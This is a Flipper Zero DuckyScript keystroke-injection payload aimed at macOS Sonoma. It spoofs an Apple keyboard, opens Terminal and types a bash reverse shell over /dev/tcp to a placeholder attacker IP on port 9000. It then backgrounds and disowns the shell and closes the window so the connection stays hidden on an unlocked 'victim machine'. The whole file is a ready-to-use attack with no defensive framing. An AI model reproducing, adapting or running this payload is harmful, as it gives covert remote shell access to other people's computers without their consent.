REM reverse shell special MacOS Sonoma and the extra security added (mostly popup windows with confirmation needed)
REM This script will open the terminal, open a remote connexion beteween the Mac and another computer. You need to replace REPLACE_WITH_LOCAL_IP_OF_YOUR_ATTACKER_COMPUTER with your IP.
REM Then it closes the terminal window without closing the connexion (a little bit like an @echo off).
REM Note that you will need to physically access the victim machine (unlocked). You can disconnect the flipper0 once injected.
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 1000
STRING bash -c "bash -i >& /dev/tcp/REPLACE_WITH_LOCAL_IP_OF_YOUR_ATTACKER_COMPUTER/9000 0>&1"
DELAY 1000
ENTER
CONTROL z
STRING bg
DELAY 200
ENTER
DELAY 200
STRING disown
DELAY 200
ENTER
DELAY 200
GUI w
DELAY 200
ENTER
DELAY 1000
